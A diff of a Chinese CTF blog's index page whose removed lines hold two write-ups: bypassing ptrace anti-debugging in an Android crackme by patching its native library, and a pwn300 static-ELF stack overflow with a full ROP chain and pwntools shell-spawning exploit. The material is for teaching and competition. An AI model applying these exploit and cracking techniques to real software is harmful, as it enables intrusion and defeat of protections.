-<h3 id="在要调试的函数下断点，这里我们在JNI-OnLoad下断。"><a href="#在要调试的函数下断点，这里我们在JNI-OnLoad下断。" class="headerlink" title="在要调试的函数下断点，这里我们在JNI_OnLoad下断。"></a>在要调试的函数下断点，这里我们在JNI_OnLoad下断。</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0l03rv2j31kw0n54d1.jpg" alt=""></p>
-<h3 id="设置IDA"><a href="#设置IDA" class="headerlink" title="设置IDA"></a>设置IDA</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0eyg040j318a14otra.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny0fqqwhcj30ue0nuq8u.jpg" alt=""></p>
-<h3 id="attach进程"><a href="#attach进程" class="headerlink" title="attach进程"></a>attach进程</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny0hgcahsj30ks0netg9.jpg" alt=""><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0gyl380j30xc0qw7c7.jpg" alt=""><br>断在libc.so<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0i5xmklj31h80ponbm.jpg" alt=""><br><strong>tips:这里为什么会断在libc.so中呢</strong><br>android系统中libc是c层中最基本的函数库，libc中封装了io、文件、socket等基本系统调用。所有上层的调用都需要经过libc封装层。所以libc.so是最基本的，所以会断在这里，而且我们还需要知道一些常用的系统so,比如linker</p>
-<h3 id="在控制台使用jdb恢复进程运行"><a href="#在控制台使用jdb恢复进程运行" class="headerlink" title="在控制台使用jdb恢复进程运行"></a>在控制台使用jdb恢复进程运行</h3><p><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code><br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0nb9v75j30g001wglx.jpg" alt=""><br>按下F9执行程序<br>弹出窗口，这里是问apk里的so文件和我们正在调试的是否是同一个，当然是same<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny0nt58mtj31kw0b647j.jpg" alt=""><br>正常情况会出现:<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0ovayd9j30fm02ymxn.jpg" alt=""><br>报错处理：<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0q9s9rhj30gb0ajjtg.jpg" alt=""></p>
-<ul>
-<li>打开ddms尝试.</li>
-<li>检查调试的app配置文件中是否有android:debuggable=”true”，导致不能调试。若无则在清单文件的application中加上,重新打包即可.<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny0r84fb2j31jk0esq4l.jpg" alt=""><h3 id="JNI-OnLoad中单步调试找到check点"><a href="#JNI-OnLoad中单步调试找到check点" class="headerlink" title="JNI_OnLoad中单步调试找到check点"></a>JNI_OnLoad中单步调试找到check点</h3>函数顺利断下<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny0rp83etj31fc0ou4d8.jpg" alt=""><br>F8单步找到Check点<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fnxzwyv4xkj316w0eyk0b.jpg" alt=""><br>执行<code>BLX R7</code>之后就跳入libc中断<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny03c4jhmj314609e79b.jpg" alt=""><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny0utqfacj30ye08yjwd.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny0wnijqoj30yi0fe10x.jpg" alt=""><br>反编译一下，找到BLX R7那行函数,这个函数就是pthread_create,它调用sub_16A4<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny1sdzxa9j31je13sqk3.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny1sltzepj30tg0aiq4y.jpg" alt=""><br><strong>进入sub_16A4,它调用sub_130C，在这里进行反调试，所以我们只需要把它nop即可</strong><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny1trsaaaj30gy0a0myo.jpg" alt=""><h3 id="另外的一些分析"><a href="#另外的一些分析" class="headerlink" title="另外的一些分析"></a>另外的一些分析</h3>在module list里找到libc.so，再从中找到fopen函数<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny15obitcj30uc0ja11i.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny16bi70tj31160dsaea.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny16yfq3yj30uk0koq70.jpg" alt=""><br>在fopen断下之后，查看hex窗口<br>（在这之前需要先设置hex数据与R0同步）<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny1aniwolj30y00j444r.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny19n03wej317e0wsk8v.jpg" alt=""><br>查看一下这个8358进程是什么，果然是我们的crack apk，再看看它的status，发现被trace了<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny1eyodbcj30fw06omy2.jpg" alt=""><br>这个trace的进程就是我们的android_server<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny1g5po07j30et01bwel.jpg" alt=""></li>
-</ul>
-<h3 id="patch-so"><a href="#patch-so" class="headerlink" title="patch so"></a>patch so</h3><p>arm中对应的nop指令是：00 00 00 00<br>我们可以选择nop掉BL sub_130C,或者直接nop掉BLX R7，这里我们nop后者<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny2rrr0gdj30zw0p87io.jpg" alt=""><br>数据窗口中跟随，按F2去编辑<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny2sxbvkvj311y12kh53.jpg" alt=""><br>修改并保存<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fny2u9p4oqj314i0ow14u.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny2ut0of2j30xq0y84g4.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny32s8rw5j30sq0i0jvt.jpg" alt=""><br><strong>感觉IDA的patch并不是很好用，所以我们记下地址后用010editor打开修改更好</strong><br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny3cp95etj30uw08ftd1.jpg" alt=""><br>将原apk中的so文件替换为此so文件,重新打包签名安装,现在直接打开app调试就不会退出了. Success!</p>
-<h2 id="securityCheck"><a href="#securityCheck" class="headerlink" title="securityCheck"></a>securityCheck</h2><h3 id="找到securityCheck函数下断"><a href="#找到securityCheck函数下断" class="headerlink" title="找到securityCheck函数下断"></a>找到securityCheck函数下断</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fny3joou5bj30ps0gp0w5.jpg" alt=""><br>输入密码后断下<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fny3qea9cwj30kg07v41b.jpg" alt=""><br>剩下的就是很简单的比较<br><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fny3u79wd5j30g207v764.jpg" alt=""><br>直接找到密码，over~<br>flag是aiyou,bucuoo</p>
-
-          
+          题目链接https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/AliCrackme_2.apk
+反调试原理ptraceptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/01/30/ali_re2/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1711,7 +1772,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sakura">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/sakura_heart.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1795,6 +1856,17 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/01/25/stack_elf_static1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/01/25/stack_elf_static1/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -1821,18 +1893,15 @@
       
         
           
-            <h2 id="Linux栈溢出——静态链接"><a href="#Linux栈溢出——静态链接" class="headerlink" title="Linux栈溢出——静态链接"></a>Linux栈溢出——静态链接</h2><p>一般情况下，静态链接的程序很少出现，但是也有一些。这类elf的漏洞利用，主要还是依靠程序本身和用户输入。<br>利用方式：<br>（1）程序中含有system函数和/bin/sh字符串，直接构造调用system(‘/bin/sh’)的payload。<br>（2）寻找程序中的gadget，直接构造出payload。</p>
-<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn300" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn300</a></p>
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnrxyxheafj315a1a8k36.jpg" alt=""></p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="checksec-安全性检查"><a href="#checksec-安全性检查" class="headerlink" title="checksec 安全性检查"></a>checksec 安全性检查</h3><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fnrx2e7dquj30gs03zaal.jpg" alt=""><br>32位程序，没有ASLR，没有canary，可以说是十分好利用了。</p>
-<h3 id="查看是否静态链接"><a href="#查看是否静态链接" class="headerlink" title="查看是否静态链接"></a>查看是否静态链接</h3><p>ldd pwn300<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnry61724rj309v01iaa3.jpg" alt=""><br>确定是静态链接了，那么我们之间在elf文件里找gadget即可</p>
-<h3 id="ROPgadget生成rop链"><a href="#ROPgadget生成rop链" class="headerlink" title="ROPgadget生成rop链"></a>ROPgadget生成rop链</h3><p>关于ROPgadget：<a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget/tree/master</a><br>关于ROP：<a href="https://www.slideshare.net/hackstuff/rop-40525248" target="_blank" rel="noopener">https://www.slideshare.net/hackstuff/rop-40525248</a><br><code>ROPgadget --binary pwn300 --ropchain</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ed0a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bb406</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a1dad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ed0a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bb406</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a1dad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ed0a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08054730</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a1dad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ed31</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ed0a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08054730</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b75f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049781</span>) <span class="comment"># int 0x80</span></span><br></pre></td></tr></table></figure></p>
-<p>因为我们需要的不是这种形式的，所以写个脚本处理一下。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rop = []</span><br><span class="line"><span class="comment"># i = 1</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"data"</span>):</span><br><span class="line">    <span class="comment"># print line,</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"pack"</span> <span class="keyword">in</span> line:</span><br><span class="line">        <span class="comment"># print i</span></span><br><span class="line">        <span class="comment"># print str(line).split(", ")[1].split(")")[0]</span></span><br><span class="line">        rop.append(str(line).split(<span class="string">", "</span>)[<span class="number">1</span>].split(<span class="string">")"</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># print i</span></span><br><span class="line">        <span class="comment"># print line</span></span><br><span class="line">        rop.append(str(line).split(<span class="string">"+= "</span>)[<span class="number">1</span>][<span class="number">1</span>:<span class="number">-2</span>])</span><br><span class="line">    <span class="comment"># i += 1</span></span><br><span class="line"><span class="keyword">print</span> rop</span><br></pre></td></tr></table></figure></p>
-<p>[‘0x0806ed0a’, ‘0x080ea060’, ‘0x080bb406’, ‘/bin’, ‘0x080a1dad’, ‘0x0806ed0a’, ‘0x080ea064’, ‘0x080bb406’, ‘//sh’, ‘0x080a1dad’, ‘0x0806ed0a’, ‘0x080ea068’, ‘0x08054730’, ‘0x080a1dad’, ‘0x080481c9’, ‘0x080ea060’, ‘0x0806ed31’, ‘0x080ea068’, ‘0x080ea060’, ‘0x0806ed0a’, ‘0x080ea068’, ‘0x08054730’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x08049781’]<br>把两个字符串再处理一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">print &apos;0x&apos;+binascii.b2a_hex(&apos;nib/&apos;)</span><br><span class="line">print &apos;0x&apos;+binascii.b2a_hex(&apos;hs//&apos;)</span><br></pre></td></tr></table></figure></p>
-<p>得到0x6e69622f,0x68732f2f<br>替换进去，得到rop=<br>[‘0x0806ed0a’, ‘0x080ea060’, ‘0x080bb406’, ‘0x6e69622f’, ‘0x080a1dad’, ‘0x0806ed0a’, ‘0x080ea064’, ‘0x080bb406’, ‘0x68732f2f’, ‘0x080a1dad’, ‘0x0806ed0a’, ‘0x080ea068’, ‘0x08054730’, ‘0x080a1dad’, ‘0x080481c9’, ‘0x080ea060’, ‘0x0806ed31’, ‘0x080ea068’, ‘0x080ea060’, ‘0x0806ed0a’, ‘0x080ea068’, ‘0x08054730’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x0807b75f’, ‘0x08049781’]</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fns55rhcvpj30gf07wdgr.jpg" alt=""></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode_hex=[&apos;0x0806ed0a&apos;, &apos;0x080ea060&apos;, &apos;0x080bb406&apos;, &apos;0x6e69622f&apos;, &apos;0x080a1dad&apos;, &apos;0x0806ed0a&apos;, &apos;0x080ea064&apos;, &apos;0x080bb406&apos;, &apos;0x68732f2f&apos;, &apos;0x080a1dad&apos;, &apos;0x0806ed0a&apos;, &apos;0x080ea068&apos;, &apos;0x08054730&apos;, &apos;0x080a1dad&apos;, &apos;0x080481c9&apos;, &apos;0x080ea060&apos;, &apos;0x0806ed31&apos;, &apos;0x080ea068&apos;, &apos;0x080ea060&apos;, &apos;0x0806ed0a&apos;, &apos;0x080ea068&apos;, &apos;0x08054730&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x0807b75f&apos;, &apos;0x08049781&apos;]</span><br><span class="line">shellcode=[]</span><br><span class="line">for i in shellcode_hex:</span><br><span class="line">     shellcode.append(int(i,16))</span><br><span class="line">payload = []</span><br><span class="line">QJ = 16</span><br><span class="line">for i in range(QJ):</span><br><span class="line">    payload.append(i)</span><br><span class="line">for i in shellcode:</span><br><span class="line">    payload.append(i)</span><br><span class="line">p = process(&apos;pwn300&apos;)</span><br><span class="line"># p = remote(&apos;118.190.85.135&apos;,10080)</span><br><span class="line">tot = QJ+len(shellcode)</span><br><span class="line">p.recvuntil(&apos;calculate:&apos;)</span><br><span class="line">p.sendline(str(tot+1))</span><br><span class="line">for i in range(QJ):</span><br><span class="line">    p.recvuntil(&apos;5 Save the result\n&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;input the integer x:&apos;)</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recvuntil(&apos;input the integer y:&apos;)</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recvuntil(&apos;\n&apos;)</span><br><span class="line">for i in range(QJ,tot):</span><br><span class="line">    p.recvuntil(&apos;5 Save the result\n&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;input the integer x:&apos;)</span><br><span class="line">    p.sendline(str(payload[i]))</span><br><span class="line">    p.recvuntil(&apos;input the integer y:&apos;)</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recvuntil(&apos;\n&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(&apos;5&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-          
+          Linux栈溢出——静态链接一般情况下，静态链接的程序很少出现，但是也有一些。这类elf的漏洞利用，主要还是依靠程序本身和用户输入。利用方式：（1）程序中含有system函数和/bin/sh字符串，直接构造调用system(‘/bin/sh’)的payload。（2）寻找程序中的gadget，直接构
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/01/25/stack_elf_static1/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1905,6 +1974,10 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
+              <img class="site-author-image" itemprop="image"
+                src="/images/sakura_heart.png"
+                alt="sakura" />
+            
               <p class="site-author-name" itemprop="name">sakura</p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
@@ -1956,11 +2029,65 @@
           
 
           
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/eternalsakura" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eternalsakura13@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/sakura1328/activities" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-globe"></i>知乎</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/eternalsakura13" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
 
           
           
 
           
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p1umer.club/" title="P1umer" target="_blank">P1umer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://lirsakura.me/" title="绘梨衣" target="_blank">绘梨衣</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://dwfault-blog.imwork.net:30916/" title="dwfalut" target="_blank">dwfalut</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.auxy.xyz" title="Auxy" target="_blank">Auxy</a>
+                  </li>
+                
+              </ul>
+            </div>
           
 
           
@@ -2121,6 +2248,14 @@
 
   
 
+    
+      <script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script>
+    
+
+    
+
+  
+
 
 
 
@@ -2150,6 +2285,323 @@
 
 
   
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
